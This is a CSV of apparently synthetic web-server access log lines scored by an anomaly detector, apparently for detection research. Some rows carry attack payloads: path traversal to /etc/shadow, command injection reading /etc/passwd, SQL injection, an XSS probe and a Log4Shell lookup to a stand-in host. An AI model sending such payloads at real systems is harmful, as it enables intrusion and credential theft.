score_content,score_session,score_fused,score_fused_norm,line
71.84801483154297,,71.84801483154297,71.84801483154297,81.200.104.224 - - [10/Jan/2025:12:00:22 +0000] "OPTIONS /api/products HTTP/1.1" 200 18015 "https://www.google.com/" "sqlmap/1.7.2#stable"
30171.748046875,,30171.748046875,30171.748046875,37.160.211.71 - - [10/Jan/2025:12:00:24 +0000] "DELETE /search?q=router HTTP/1.1" 404 778 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
2.2577054500579834,,2.2577054500579834,2.2577054500579834,126.135.210.153 - - [10/Jan/2025:12:00:24 +0000] "GET / HTTP/1.1" 200 9138 "https://www.google.com/" "dirb/2.22"
34.88939666748047,,34.88939666748047,34.88939666748047,30.171.63.78 - - [10/Jan/2025:12:00:24 +0000] "PUT /search?q=monitor HTTP/1.1" 200 14679 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
46.413448333740234,,46.413448333740234,46.413448333740234,175.220.173.244 - - [10/Jan/2025:12:00:25 +0000] "HEAD /dashboard HTTP/1.1" 200 3493 "https://twitter.com/" "curl/7.85.0"
68.45543670654297,,68.45543670654297,68.45543670654297,120.251.21.235 - - [10/Jan/2025:12:00:25 +0000] "HEAD /search?q=headphones HTTP/1.1" 200 4974 "https://news.ycombinator.com/" "nikto/2.5.0"
2.9136011600494385,,2.9136011600494385,2.9136011600494385,166.11.182.162 - - [10/Jan/2025:12:00:25 +0000] "POST /.git/config HTTP/1.1" 200 7421 "https://news.ycombinator.com/" "curl/7.85.0"
1.901773452758789,,1.901773452758789,1.901773452758789,203.162.27.201 - - [10/Jan/2025:12:00:28 +0000] "GET /dashboard HTTP/1.1" 204 11689 "-" "curl/7.85.0"
4.435972213745117,,4.435972213745117,4.435972213745117,21.41.141.165 - - [10/Jan/2025:12:00:28 +0000] "POST /api/products HTTP/1.1" 204 3611 "https://twitter.com/" "dirb/2.22"
0.38790079951286316,,0.38790079951286316,0.38790079951286316,85.218.142.119 - - [10/Jan/2025:12:00:29 +0000] "GET /index.html HTTP/1.1" 200 13741 "https://www.google.com/" "nikto/2.5.0"
94.12993621826172,,94.12993621826172,94.12993621826172,70.149.97.8 - - [10/Jan/2025:12:00:29 +0000] "OPTIONS /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 201 11946 "https://www.google.com/" "sqlmap/1.7.2#stable"
103.01384735107422,,103.01384735107422,103.01384735107422,246.72.134.144 - - [10/Jan/2025:12:00:29 +0000] "TRACE /contact HTTP/1.1" 201 13169 "https://www.google.com/" "python-requests/2.31.0"
68.54884338378906,,68.54884338378906,68.54884338378906,197.171.83.4 - - [10/Jan/2025:12:00:29 +0000] "HEAD /search?q=phone HTTP/1.1" 200 1387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
103.01826477050781,,103.01826477050781,103.01826477050781,102.122.45.4 - - [10/Jan/2025:12:00:29 +0000] "TRACE /profile HTTP/1.1" 200 13938 "https://www.google.com/" "nikto/2.5.0"
30124.26171875,,30124.26171875,30124.26171875,134.201.207.41 - - [10/Jan/2025:12:00:30 +0000] "GET /.git/config HTTP/1.1" 404 1310 "https://www.google.com/" "curl/7.85.0"
26.60772132873535,,26.60772132873535,26.60772132873535,246.244.134.140 - - [10/Jan/2025:12:00:30 +0000] "POST /search?q=monitor HTTP/1.1" 200 14050 "-" "python-requests/2.31.0"
71.11735534667969,,71.11735534667969,71.11735534667969,7.199.93.150 - - [10/Jan/2025:12:00:32 +0000] "HEAD /search?q=headphones HTTP/1.1" 304 10794 "https://www.google.com/" "sqlmap/1.7.2#stable"
2.2239160537719727,,2.2239160537719727,2.2239160537719727,103.177.136.102 - - [10/Jan/2025:12:00:32 +0000] "GET / HTTP/1.1" 204 2148 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.3880966305732727,,0.3880966305732727,0.3880966305732727,185.117.22.254 - - [10/Jan/2025:12:00:32 +0000] "GET /index.html HTTP/1.1" 201 14342 "https://twitter.com/" "sqlmap/1.7.2#stable"
1.9187812805175781,,1.9187812805175781,1.9187812805175781,173.220.198.93 - - [10/Jan/2025:12:00:35 +0000] "GET /api/products HTTP/1.1" 200 19291 "-" "sqlmap/1.7.2#stable"
101.39325714111328,,101.39325714111328,101.39325714111328,35.52.170.211 - - [10/Jan/2025:12:00:36 +0000] "TRACE /.git/config HTTP/1.1" 200 5487 "https://news.ycombinator.com/" "nikto/2.5.0"
12.856781959533691,,12.856781959533691,12.856781959533691,225.121.69.206 - - [10/Jan/2025:12:00:39 +0000] "PUT /profile HTTP/1.1" 200 19783 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
102.98479461669922,,102.98479461669922,102.98479461669922,181.179.42.39 - - [10/Jan/2025:12:00:42 +0000] "TRACE /contact HTTP/1.1" 200 4877 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.938646674156189,,1.938646674156189,1.938646674156189,188.132.109.160 - - [10/Jan/2025:12:00:42 +0000] "GET /profile HTTP/1.1" 200 2182 "https://news.ycombinator.com/" "dirb/2.22"
74.43473815917969,,74.43473815917969,74.43473815917969,242.180.136.170 - - [10/Jan/2025:12:00:42 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 304 7216 "https://www.google.com/" "sqlmap/1.7.2#stable"
46.43819808959961,,46.43819808959961,46.43819808959961,235.12.66.108 - - [10/Jan/2025:12:00:42 +0000] "HEAD /dashboard HTTP/1.1" 200 9650 "https://example.com/" "sqlmap/1.7.2#stable"
125.14606475830078,,125.14606475830078,125.14606475830078,71.9.225.83 - - [10/Jan/2025:12:00:42 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 17682 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
96.47676086425781,,96.47676086425781,96.47676086425781,44.154.97.250 - - [10/Jan/2025:12:00:45 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 302 11379 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
51.50925064086914,,51.50925064086914,51.50925064086914,204.135.126.174 - - [10/Jan/2025:12:00:45 +0000] "DELETE /search?q=ssd HTTP/1.1" 301 6926 "https://twitter.com/" "dirb/2.22"
26.625150680541992,,26.625150680541992,26.625150680541992,46.20.67.85 - - [10/Jan/2025:12:00:48 +0000] "POST /search?q=router HTTP/1.1" 200 12838 "https://example.com/" "curl/7.85.0"
2.029024362564087,,2.029024362564087,2.029024362564087,34.90.174.106 - - [10/Jan/2025:12:00:50 +0000] "GET /login HTTP/1.1" 200 6204 "https://twitter.com/" "curl/7.85.0"
48.848167419433594,,48.848167419433594,48.848167419433594,172.112.142.5 - - [10/Jan/2025:12:00:50 +0000] "DELETE /search?q=monitor HTTP/1.1" 204 11488 "-" "python-requests/2.31.0"
51.42002868652344,,51.42002868652344,51.42002868652344,16.240.147.61 - - [10/Jan/2025:12:00:53 +0000] "DELETE /search?q=monitor HTTP/1.1" 302 3473 "https://www.google.com/" "curl/7.85.0"
30124.29296875,,30124.29296875,30124.29296875,150.245.134.158 - - [10/Jan/2025:12:00:53 +0000] "GET /index.html HTTP/1.1" 401 93 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.4809441566467285,,4.4809441566467285,4.4809441566467285,241.88.235.79 - - [10/Jan/2025:12:00:55 +0000] "POST /dashboard HTTP/1.1" 200 10064 "https://example.com/" "dirb/2.22"
125.02545928955078,,125.02545928955078,125.02545928955078,112.109.103.59 - - [10/Jan/2025:12:00:56 +0000] "TRACE /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 3403 "-" "curl/7.85.0"
34.90606689453125,,34.90606689453125,34.90606689453125,193.153.151.88 - - [10/Jan/2025:12:00:57 +0000] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 200 8857 "https://news.ycombinator.com/" "nikto/2.5.0"
70.19699096679688,,70.19699096679688,70.19699096679688,8.164.74.146 - - [10/Jan/2025:12:00:58 +0000] "OPTIONS /cgi-bin/test.cgi HTTP/1.1" 200 14484 "https://twitter.com/" "dirb/2.22"
4.588364601135254,,4.588364601135254,4.588364601135254,130.159.68.149 - - [10/Jan/2025:12:01:01 +0000] "GET /profile HTTP/1.1" 302 7735 "https://example.com/" "nikto/2.5.0"
30147.4296875,,30147.4296875,30147.4296875,81.173.119.104 - - [10/Jan/2025:12:01:04 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 403 1493 "https://twitter.com/" "python-requests/2.31.0"
96.43789672851562,,96.43789672851562,96.43789672851562,123.219.188.244 - - [10/Jan/2025:12:01:04 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 301 6256 "https://example.com/" "python-requests/2.31.0"
125.13237762451172,,125.13237762451172,125.13237762451172,139.120.152.142 - - [10/Jan/2025:12:01:05 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 13104 "https://news.ycombinator.com/" "dirb/2.22"
11059.9755859375,,11059.9755859375,11059.9755859375,100.88.28.217 - - [10/Jan/2025:12:01:05 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 502 1262 "https://www.google.com/" "python-requests/2.31.0"
0.27889177203178406,,0.27889177203178406,0.27889177203178406,217.85.28.128 - - [10/Jan/2025:12:01:06 +0000] "GET /assets/app.js HTTP/1.1" 200 7290 "-" "python-requests/2.31.0"
4.533637523651123,,4.533637523651123,4.533637523651123,50.130.202.112 - - [10/Jan/2025:12:01:06 +0000] "POST /contact HTTP/1.1" 204 7662 "-" "dirb/2.22"
0.2917652726173401,,0.2917652726173401,0.2917652726173401,187.3.92.144 - - [10/Jan/2025:12:01:06 +0000] "GET /assets/app.css HTTP/1.1" 201 18763 "https://twitter.com/" "nikto/2.5.0"
47.41099548339844,,47.41099548339844,47.41099548339844,87.138.138.244 - - [10/Jan/2025:12:01:06 +0000] "HEAD /cgi-bin/test.cgi HTTP/1.1" 304 4457 "https://example.com/" "nikto/2.5.0"
26.78321647644043,,26.78321647644043,26.78321647644043,9.243.52.194 - - [10/Jan/2025:12:01:09 +0000] "DELETE /contact HTTP/1.1" 200 1444 "https://example.com/" "python-requests/2.31.0"
0.24723070859909058,,0.24723070859909058,0.24723070859909058,25.136.36.93 - - [10/Jan/2025:12:01:09 +0000] "GET /assets/app.css HTTP/1.1" 200 5729 "-" "python-requests/2.31.0"
48.8258056640625,,48.8258056640625,48.8258056640625,111.178.229.50 - - [10/Jan/2025:12:01:10 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 903 "https://news.ycombinator.com/" "python-requests/2.31.0"
72.00440216064453,,72.00440216064453,72.00440216064453,223.254.135.66 - - [10/Jan/2025:12:01:12 +0000] "OPTIONS /login HTTP/1.1" 200 18396 "https://example.com/" "curl/7.85.0"
127.59496307373047,,127.59496307373047,127.59496307373047,34.111.191.72 - - [10/Jan/2025:12:01:14 +0000] "TRACE /search?q=headphones HTTP/1.1" 302 15098 "https://twitter.com/" "nikto/2.5.0"
103.03380584716797,,103.03380584716797,103.03380584716797,157.81.125.193 - - [10/Jan/2025:12:01:15 +0000] "TRACE /profile HTTP/1.1" 200 19274 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30225.6953125,,30225.6953125,30225.6953125,220.205.69.97 - - [10/Jan/2025:12:01:16 +0000] "TRACE /logout HTTP/1.1" 403 346 "https://example.com/" "curl/7.85.0"
12.765912055969238,,12.765912055969238,12.765912055969238,116.224.60.221 - - [10/Jan/2025:12:01:17 +0000] "PUT /dashboard HTTP/1.1" 200 12291 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
68.55416107177734,,68.55416107177734,68.55416107177734,37.174.77.174 - - [10/Jan/2025:12:01:20 +0000] "HEAD /api/product?id=123 HTTP/1.1" 200 6819 "https://news.ycombinator.com/" "nikto/2.5.0"
71.92292022705078,,71.92292022705078,71.92292022705078,133.82.198.31 - - [10/Jan/2025:12:01:20 +0000] "OPTIONS /logout HTTP/1.1" 200 5747 "-" "sqlmap/1.7.2#stable"
94.0537338256836,,94.0537338256836,94.0537338256836,49.184.236.219 - - [10/Jan/2025:12:01:21 +0000] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 16491 "https://example.com/" "python-requests/2.31.0"
2.952954053878784,,2.952954053878784,2.952954053878784,137.90.253.223 - - [10/Jan/2025:12:01:24 +0000] "POST /.git/config HTTP/1.1" 200 18954 "https://twitter.com/" "dirb/2.22"
102.93708801269531,,102.93708801269531,102.93708801269531,29.225.147.74 - - [10/Jan/2025:12:01:27 +0000] "TRACE /dashboard HTTP/1.1" 200 10110 "-" "dirb/2.22"
71.1644287109375,,71.1644287109375,71.1644287109375,191.33.122.78 - - [10/Jan/2025:12:01:30 +0000] "HEAD /search?q=phone HTTP/1.1" 302 7368 "https://twitter.com/" "dirb/2.22"
29.36823844909668,,29.36823844909668,29.36823844909668,89.121.163.18 - - [10/Jan/2025:12:01:30 +0000] "DELETE /dashboard HTTP/1.1" 302 12656 "https://example.com/" "nikto/2.5.0"
68.54517364501953,,68.54517364501953,68.54517364501953,107.227.234.28 - - [10/Jan/2025:12:01:30 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 14954 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
127.59441375732422,,127.59441375732422,127.59441375732422,221.84.63.83 - - [10/Jan/2025:12:01:30 +0000] "TRACE /search?q=headphones HTTP/1.1" 302 14920 "https://twitter.com/" "python-requests/2.31.0"
37.48381042480469,,37.48381042480469,37.48381042480469,1.34.25.91 - - [10/Jan/2025:12:01:30 +0000] "PUT /api/product?id=123 HTTP/1.1" 302 1142 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
30136.185546875,,30136.185546875,30136.185546875,37.142.46.249 - - [10/Jan/2025:12:01:32 +0000] "PUT /login HTTP/1.1" 400 1115 "-" "python-requests/2.31.0"
68.59923553466797,,68.59923553466797,68.59923553466797,237.128.112.63 - - [10/Jan/2025:12:01:33 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 2944 "https://twitter.com/" "sqlmap/1.7.2#stable"
34.880821228027344,,34.880821228027344,34.880821228027344,186.226.47.60 - - [10/Jan/2025:12:01:36 +0000] "PUT /api/product?id=123 HTTP/1.1" 200 2563 "https://twitter.com/" "sqlmap/1.7.2#stable"
30216.4453125,,30216.4453125,30216.4453125,254.41.82.225 - - [10/Jan/2025:12:01:36 +0000] "OPTIONS /search?q=phone HTTP/1.1" 403 267 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30225.470703125,,30225.470703125,30225.470703125,173.99.29.63 - - [10/Jan/2025:12:01:37 +0000] "TRACE /api/products HTTP/1.1" 401 1388 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
7.222555160522461,,7.222555160522461,7.222555160522461,84.208.23.221 - - [10/Jan/2025:12:01:39 +0000] "POST /logout HTTP/1.1" 302 15714 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11108.5263671875,,11108.5263671875,11108.5263671875,131.197.29.254 - - [10/Jan/2025:12:01:42 +0000] "OPTIONS /about HTTP/1.1" 500 52 "https://www.google.com/" "sqlmap/1.7.2#stable"
94.00732421875,,94.00732421875,94.00732421875,56.212.81.60 - - [10/Jan/2025:12:01:45 +0000] "OPTIONS /search?q=phone HTTP/1.1" 200 189 "https://twitter.com/" "sqlmap/1.7.2#stable"
125.04336547851562,,125.04336547851562,125.04336547851562,77.218.213.222 - - [10/Jan/2025:12:01:45 +0000] "TRACE /api/product?id=123 HTTP/1.1" 200 4976 "https://news.ycombinator.com/" "curl/7.85.0"
30125.693359375,,30125.693359375,30125.693359375,221.201.234.229 - - [10/Jan/2025:12:01:47 +0000] "GET /profile HTTP/1.1" 400 183 "https://www.google.com/" "curl/7.85.0"
0.35573503375053406,,0.35573503375053406,0.35573503375053406,182.67.210.141 - - [10/Jan/2025:12:01:47 +0000] "GET /index.html HTTP/1.1" 200 5461 "https://www.google.com/" "curl/7.85.0"
12.74092960357666,,12.74092960357666,12.74092960357666,81.124.182.242 - - [10/Jan/2025:12:01:49 +0000] "PUT /api/products HTTP/1.1" 200 8966 "-" "nikto/2.5.0"
71.8337173461914,,71.8337173461914,71.8337173461914,168.20.19.73 - - [10/Jan/2025:12:01:52 +0000] "OPTIONS /dashboard HTTP/1.1" 200 9550 "https://example.com/" "nikto/2.5.0"
29.2407283782959,,29.2407283782959,29.2407283782959,52.171.215.10 - - [10/Jan/2025:12:01:54 +0000] "POST /search?q=laptop HTTP/1.1" 304 6329 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
46.5693359375,,46.5693359375,46.5693359375,114.142.235.126 - - [10/Jan/2025:12:01:56 +0000] "HEAD /login HTTP/1.1" 200 6725 "-" "curl/7.85.0"
25.472118377685547,,25.472118377685547,25.472118377685547,104.19.206.95 - - [10/Jan/2025:12:01:57 +0000] "DELETE /.env HTTP/1.1" 200 17568 "-" "python-requests/2.31.0"
24.0310001373291,,24.0310001373291,24.0310001373291,168.110.83.167 - - [10/Jan/2025:12:02:00 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 7518 "https://example.com/" "python-requests/2.31.0"
24.05231475830078,,24.05231475830078,24.05231475830078,194.152.37.83 - - [10/Jan/2025:12:02:02 +0000] "GET /search?q=camera HTTP/1.1" 200 16915 "https://twitter.com/" "nikto/2.5.0"
13.817007064819336,,13.817007064819336,13.817007064819336,9.45.189.230 - - [10/Jan/2025:12:02:03 +0000] "PUT /wp-login.php HTTP/1.1" 301 19361 "https://news.ycombinator.com/" "dirb/2.22"
24.024381637573242,,24.024381637573242,24.024381637573242,244.193.111.240 - - [10/Jan/2025:12:02:05 +0000] "GET /search?q=monitor HTTP/1.1" 200 14815 "https://twitter.com/" "dirb/2.22"
0.29460880160331726,,0.29460880160331726,0.29460880160331726,154.233.37.95 - - [10/Jan/2025:12:02:07 +0000] "GET /assets/app.js HTTP/1.1" 200 11289 "https://www.google.com/" "python-requests/2.31.0"
74.41020202636719,,74.41020202636719,74.41020202636719,240.118.111.197 - - [10/Jan/2025:12:02:09 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 301 17902 "https://twitter.com/" "sqlmap/1.7.2#stable"
44.77796936035156,,44.77796936035156,44.77796936035156,55.201.221.93 - - [10/Jan/2025:12:02:10 +0000] "HEAD /cgi-bin/test.cgi HTTP/1.1" 200 9260 "https://www.google.com/" "dirb/2.22"
124.9011001586914,,124.9011001586914,124.9011001586914,182.212.114.163 - - [10/Jan/2025:12:02:13 +0000] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 6958 "https://news.ycombinator.com/" "dirb/2.22"
2.276693820953369,,2.276693820953369,2.276693820953369,238.198.70.167 - - [10/Jan/2025:12:02:13 +0000] "GET / HTTP/1.1" 200 14459 "https://www.google.com/" "dirb/2.22"
68.57311248779297,,68.57311248779297,68.57311248779297,169.218.186.149 - - [10/Jan/2025:12:02:15 +0000] "HEAD /search?q=router HTTP/1.1" 200 17171 "https://example.com/" "sqlmap/1.7.2#stable"
11083.1650390625,,11083.1650390625,11083.1650390625,153.167.69.247 - - [10/Jan/2025:12:02:17 +0000] "HEAD /profile HTTP/1.1" 503 53 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.2751983404159546,,0.2751983404159546,0.2751983404159546,38.36.142.18 - - [10/Jan/2025:12:02:19 +0000] "GET /assets/app.css HTTP/1.1" 200 12845 "-" "Wget/1.21.2 (linux-gnu)"
68.55680847167969,,68.55680847167969,68.55680847167969,251.44.246.154 - - [10/Jan/2025:12:02:20 +0000] "HEAD /search?q=router HTTP/1.1" 200 11820 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
49.1267204284668,,49.1267204284668,49.1267204284668,91.246.58.18 - - [10/Jan/2025:12:02:20 +0000] "HEAD /profile HTTP/1.1" 304 1356 "https://example.com/" "curl/7.85.0"
68.45877838134766,,68.45877838134766,68.45877838134766,152.252.137.21 - - [10/Jan/2025:12:02:22 +0000] "HEAD /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 3070 "-" "nikto/2.5.0"
11108.4443359375,,11108.4443359375,11108.4443359375,11.132.174.100 - - [10/Jan/2025:12:02:23 +0000] "OPTIONS /contact HTTP/1.1" 502 807 "https://news.ycombinator.com/" "curl/7.85.0"
0.2531016767024994,,0.2531016767024994,0.2531016767024994,61.91.41.56 - - [10/Jan/2025:12:02:23 +0000] "GET /assets/app.js HTTP/1.1" 204 1559 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
37.601200103759766,,37.601200103759766,37.601200103759766,163.106.69.143 - - [10/Jan/2025:12:02:25 +0000] "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 304 5364 "-" "nikto/2.5.0"
5.449579238891602,,5.449579238891602,5.449579238891602,150.89.83.93 - - [10/Jan/2025:12:02:28 +0000] "POST /cgi-bin/test.cgi HTTP/1.1" 304 4775 "https://example.com/" "sqlmap/1.7.2#stable"
26.83561897277832,,26.83561897277832,26.83561897277832,22.110.83.149 - - [10/Jan/2025:12:02:28 +0000] "DELETE /logout HTTP/1.1" 200 6717 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.81548500061035,,26.81548500061035,26.81548500061035,45.104.57.241 - - [10/Jan/2025:12:02:29 +0000] "DELETE /contact HTTP/1.1" 200 10948 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.8552933931350708,,1.8552933931350708,1.8552933931350708,195.12.2.254 - - [10/Jan/2025:12:02:32 +0000] "GET /phpmyadmin HTTP/1.1" 200 6372 "https://twitter.com/" "curl/7.85.0"
34.88114929199219,,34.88114929199219,34.88114929199219,38.48.36.5 - - [10/Jan/2025:12:02:34 +0000] "PUT /search?q=router HTTP/1.1" 200 6496 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
51.46397399902344,,51.46397399902344,51.46397399902344,232.63.41.108 - - [10/Jan/2025:12:02:35 +0000] "DELETE /api/backup?file=../../../../etc/shadow HTTP/1.1" 302 7613 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
26.490680694580078,,26.490680694580078,26.490680694580078,148.197.254.196 - - [10/Jan/2025:12:02:38 +0000] "POST /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 316 "https://example.com/" "dirb/2.22"
29.225322723388672,,29.225322723388672,29.225322723388672,108.134.108.209 - - [10/Jan/2025:12:02:39 +0000] "POST /search?q=laptop HTTP/1.1" 301 19961 "-" "dirb/2.22"
12.832723617553711,,12.832723617553711,12.832723617553711,190.193.225.124 - - [10/Jan/2025:12:02:39 +0000] "PUT /logout HTTP/1.1" 204 4280 "https://example.com/" "dirb/2.22"
1.9566439390182495,,1.9566439390182495,1.9566439390182495,25.201.190.251 - - [10/Jan/2025:12:02:41 +0000] "GET /contact HTTP/1.1" 200 6766 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
48.9141960144043,,48.9141960144043,48.9141960144043,178.191.25.7 - - [10/Jan/2025:12:02:43 +0000] "HEAD /server-status HTTP/1.1" 302 6399 "https://www.google.com/" "dirb/2.22"
1.775923252105713,,1.775923252105713,1.775923252105713,89.67.167.165 - - [10/Jan/2025:12:02:45 +0000] "GET /server-status HTTP/1.1" 200 493 "https://twitter.com/" "nikto/2.5.0"
0.27381086349487305,,0.27381086349487305,0.27381086349487305,11.19.113.41 - - [10/Jan/2025:12:02:47 +0000] "GET /assets/app.css HTTP/1.1" 200 12443 "https://example.com/" "python-requests/2.31.0"
